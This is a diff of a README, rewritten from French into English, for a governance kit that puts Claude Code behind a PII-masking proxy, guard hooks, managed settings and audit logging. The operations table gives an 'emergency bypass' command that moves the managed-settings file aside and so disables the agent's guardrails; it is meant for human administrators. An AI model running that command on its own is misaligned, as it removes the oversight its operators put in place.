+For client data under contract, prefer a Team / Enterprise plan or API key (commercial terms) over consumer
+terms, and make sure model training on your conversations is disabled in your account's privacy settings.
+
+---
+
+## Getting started
+
+### Prerequisites
+
+- Linux or WSL2 (Ubuntu 22.04 / 24.04 tested)
+- Python ≥ 3.9
+- Docker with Compose v2 (Docker Desktop with WSL integration, or `docker-ce`)
+- Claude Code
+- `sudo` access (hooks and managed settings are installed system-wide, owned by root)
+
+### Installation
 
 ```bash
-unzip claude-governance.zip && cd claude-governance
-python3 -m pytest -q tests      # optionnel : 200 tests du moteur, des hooks, de la console, des projets, des réglages, de la bascule Claude / fournisseur de confiance et du verrou C3 (pip install pytest fastapi python-multipart httpx prometheus-client)
-./install.sh                    # ~5 min au premier lancement (build de Presidio avec le modèle français)
-./scripts/smoke-test.sh         # vérification de bout en bout
+git clone https://github.com/Alexweb97/ai-governance.git
+cd ai-governance
+cp .env.example .env            # then fill in the secrets (see below)
+
+./install.sh                    # ~5 min on first run (builds Presidio with the French model)
+./scripts/smoke-test.sh         # end-to-end verification
 ```
 
-L'ordre d'`install.sh` est volontaire. Les hooks et la stack sont installés et testés d'abord, et
-`managed-settings.json` est déployé **en dernier**, puisque dès qu'il existe, Claude Code passe par le proxy.
+`install.sh` is ordered on purpose: hooks and the Docker stack are installed and tested first, and
+`managed-settings.json` is deployed **last**, because as soon as it exists Claude Code routes through the proxy.
 
-`./install.sh --no-stack` installe uniquement les guardrails (hooks + permissions), sans Docker,
-proxy ni télémétrie.
+`./install.sh --no-stack` installs guardrails only (hooks + permissions), without Docker, proxy or telemetry.
 
-Puis, dans Claude Code :
+> **Behind a TLS-inspecting corporate proxy?** `install.sh` copies the CA certificates found in
+> `/usr/local/share/ca-certificates/` into `certs/` so that the containers trust them.
 
-```
-/status      → "Setting sources" doit citer les managed settings
-/hooks       → les hooks gérés doivent apparaître
-```
+### Configuration
 
-Console Grafana : **http://localhost:3001** (identifiant `admin`, mot de passe dans `.env`). Le tableau de bord
-« Claude Code — Console de gouvernance » est provisionné automatiquement.
+Main variables in your environment file (see `.env.example`):
 
-## Exploitation
-
-| Besoin | Action |
+| Variable | Description |
 |---|---|
-| Ajouter un client, une consultation, des fichiers | console http://localhost:8788 |
-| Modifier une règle avancée | éditer `policy/policy.json`, puis `./install.sh` (hooks) ; le proxy la recharge seul |
-| Voir l'audit brut | `tail -f /var/log/claude-governance/*.jsonl \| jq` |
-| Logs du proxy | `docker compose logs -f proxy` |
-| Proxy en panne | Claude Code renvoie une erreur de connexion : c'est le comportement **fail-closed** voulu. `docker compose up -d` |
-| Contournement d'urgence | `sudo mv /etc/claude-code/managed-settings.json{,.off}` (tracé par le hook `ConfigChange` au retour) |
-| Désinstaller | `./uninstall.sh` (garde l'audit) ou `./uninstall.sh --purge` |
+| `PSEUDO_SECRET` | HMAC key for tokens (≥ 32 characters). Changing it invalidates existing tokens |
+| `ADMIN_PASSWORD` | Admin console password |
+| `GRAFANA_ADMIN_PASSWORD` | Grafana `admin` password |
+| `GOV_CONFIG_DIR` | Console-managed configuration (dictionary, settings), e.g. `~/.config/claude-governance` |
+| `CLIENTS_DIR` | Root folder for client engagements |
+| `PROJECTS_DIR` | Root folder for code repositories (mounted read-only) |
+| `TRUSTED_*` | Optional trusted provider, see [Model providers](#model-providers) |
 
-L'audit ne contient **jamais de valeur sensible en clair** : uniquement des types (`EMAIL: 2`),
-des empreintes de prompt (SHA-256 tronqué) et des cibles masquées (`echo [EMAIL]`).
+### Verify
 
-## Limites, à connaître
-
-1. **Poste administré par son utilisateur.** Sous WSL, quiconque a `sudo` peut modifier `/etc/claude-code`.
-   Ce dispositif protège contre les erreurs et les comportements non voulus de l'agent, pas contre
-   un administrateur local malveillant. Pour un vrai contrôle d'entreprise, publiez la même politique via les
-   *server-managed settings* de la console claude.ai et mettez le proxy sur un serveur partagé.
-2. **Détection imparfaite.** Les regex et le NER ont des faux négatifs, surtout sur du texte libre
-   et des formats métiers maison. Ajoutez vos propres motifs (matricules, numéros de contrat…) dans `pii.patterns`.
-3. **Qualité des réponses.** Le modèle raisonne sur `PII_PERSON_…` au lieu d'un nom. C'est sans effet sur
-   du code, mais ça peut gêner sur des tâches où la valeur compte (validation de format, dédoublonnage).
-   Le jeton garde le type, ce qui limite l'effet.
-4. **À valider sur votre poste** (impossible à tester ici, sans accès réseau) :
-   - la prise en compte de `NLP_CONF_FILE`/`ANALYZER_CONF_FILE` par l'image Presidio (test n° 2 de `smoke-test.sh`) ;
-   - les versions des images (`docker-compose.yml`, figées mi-2025 : mettez-les à jour) ;
-5. **PDF scannés** : `pdftotext` ne renvoie rien sur un PDF image. L'OCR se fait en local :
-   `ocrmypdf -l fra --force-ocr scan.pdf scan.ocr.pdf`, puis `pdftotext` sur le résultat. La sortie de
-   `ocrmypdf`/`tesseract` est traitée comme un document (NER actif). Les images restent retirées des requêtes.
-6. **Dictionnaire** : un client absent de `terms.json` n'est pas masqué (sauf si le NER le prend pour
-   un lieu ou une personne). Mettez-le à jour à chaque nouvelle consultation.
-
-## Évolutions possibles
-
-- Déplacer le proxy sur un serveur et le partager entre plusieurs postes (même image), avec Redis managé.
-- Remplacer les regex `tool_guard` par OPA/Rego pour une politique versionnée et testée en CI.
-- Ajouter des recognizers Presidio maison pour vos référentiels (matricules RH, numéros client).
-- Alertes Grafana : fail-closed > 0, pic de `deny`, coût journalier au-delà d'un seuil.
-
-## Arborescence
+In Claude Code:
 
 ```
-claude-governance/
-├── claude/managed-settings.json     politique Claude Code → /etc/claude-code/
-├── policy/policy.json               règles PII + guardrails (source unique)
-├── policy/terms.example.json        format du dictionnaire (géré par la console)
-├── admin/govadmin/                  API de la console (FastAPI)
-├── admin/web/                       interface de la console (React + TypeScript + Tailwind)
-├── hooks/                           guard_prompt, guard_tool, audit (stdlib Python)
-├── proxy/app/                       pii.py (moteur), stream.py (SSE), main.py (FastAPI)
-├── presidio/                        image Presidio + modèle spaCy français
-├── observability/                   OTel collector, Prometheus, Loki, Grafana + dashboard
-├── tests/                           pytest : moteur, streaming, hooks, console, projets
-├── scripts/smoke-test.sh            vérification de bout en bout
+/status   → "Setting sources" must list the managed settings
+/hooks    → the managed hooks must be listed
+```
+
+| Service | URL |
+|---|---|
+| Admin console | http://localhost:8788 |
+| Grafana | http://localhost:3001 (`admin` / `GRAFANA_ADMIN_PASSWORD`) |
+| Proxy health | http://localhost:8787/healthz |
+
+### Running the tests
+
+```bash
+python3 -m venv .venv && . .venv/bin/activate
+pip install pytest fastapi python-multipart httpx prometheus-client
+python -m pytest -q tests
+```
+
+200 tests cover the detection engine, SSE streaming, hooks, console API, projects, settings, provider
+switching and the C3 lock.
+
+---
+
+## Operations
+
+| Task | How |
+|---|---|
+| Add a client, engagement or files | Admin console |
+| Change an advanced rule | Edit `policy/policy.json`, then `./install.sh` (hooks); the proxy reloads it automatically |
+| Inspect the raw audit trail | `tail -f /var/log/claude-governance/*.jsonl \| jq` |
+| Proxy logs | `docker compose logs -f proxy` |
+| Show the trusted provider config | `make trusted` |
+| Proxy down | Claude Code returns a connection error — this is the intended **fail-closed** behavior. Run `docker compose up -d` |
+| Emergency bypass | `sudo mv /etc/claude-code/managed-settings.json{,.off}` (logged by the `ConfigChange` hook when restored) |
+| Uninstall | `./uninstall.sh` (keeps audit logs) or `./uninstall.sh --purge` |
+
+The audit trail **never contains sensitive values in clear text**: only entity types (`EMAIL: 2`), truncated
+SHA-256 prompt fingerprints and masked targets (`echo [EMAIL]`).
+
+---
+
+## Security model and limitations
+
+1. **Self-administered workstation.** Anyone with `sudo` can modify `/etc/claude-code`. This project protects against
+   mistakes and unintended agent behavior, not against a malicious local administrator. For enterprise-grade
+   enforcement, publish the same policy through server-managed settings and run the proxy on a shared server.
+2. **Imperfect detection.** Regex and NER have false negatives, especially on free text and in-house formats.
+   Add your own patterns (employee IDs, contract numbers …) to `pii.patterns`.
+3. **Answer quality.** The model reasons about `PII_PERSON_…` instead of a real name. This is harmless for code but
+   can matter when the value itself is relevant (format validation, deduplication). Tokens keep their type,
+   which limits the impact.
+4. **Pinned images.** Container image versions in `docker-compose.yml` are pinned; review and update them regularly.
+5. **Scanned PDFs.** `pdftotext` returns nothing for image-only PDFs. Run OCR locally first
+   (`ocrmypdf -l fra --force-ocr scan.pdf scan.ocr.pdf`); OCR output is treated as a document (NER enabled).
+6. **Dictionary coverage.** A client missing from the dictionary is not masked unless NER flags it. Keep the
+   dictionary up to date, including name variants, acronyms and subsidiaries — NER does not detect organizations.
+
+Found a security issue? Please open a private advisory rather than a public issue.
+
+## Roadmap
+
+- Run the proxy as a shared service for multiple workstations, with managed Redis
+- Replace `tool_guard` regex rules with OPA / Rego for versioned, CI-tested policies
+- Custom Presidio recognizers for organization-specific identifiers
+- Grafana alerting: fail-closed events, spikes in denials, daily cost thresholds
+
+## Project layout
+
+```
+ai-governance/
+├── claude/managed-settings.json   Claude Code policy → /etc/claude-code/
+├── policy/policy.json             PII rules + guardrails (single source of truth)
+├── policy/terms.example.json      dictionary format (managed by the console)
+├── proxy/app/                     pii.py (engine), stream.py (SSE), main.py (FastAPI proxy)
+├── hooks/                         guard_prompt, guard_tool, audit, statusline (stdlib Python)
+├── admin/govadmin/                console API (FastAPI)
+├── admin/web/                     console UI (React + TypeScript + Tailwind)
+├── presidio/                      Presidio image + French spaCy model
+├── litellm/                       optional gateway to non-Anthropic providers
+├── observability/                 OTel Collector, Prometheus, Loki, Grafana dashboards
+├── deploy/nginx/                  optional reverse proxy for the console
+├── tests/                         pytest suite
+├── scripts/smoke-test.sh          end-to-end verification
 ├── docker-compose.yml
 ├── install.sh / uninstall.sh
 └── .env.example
 ```
+
+## Contributing
+
+Issues and pull requests are welcome. Please run the test suite before submitting, and never include real
+client data, credentials or personal information in issues, commits or test fixtures.
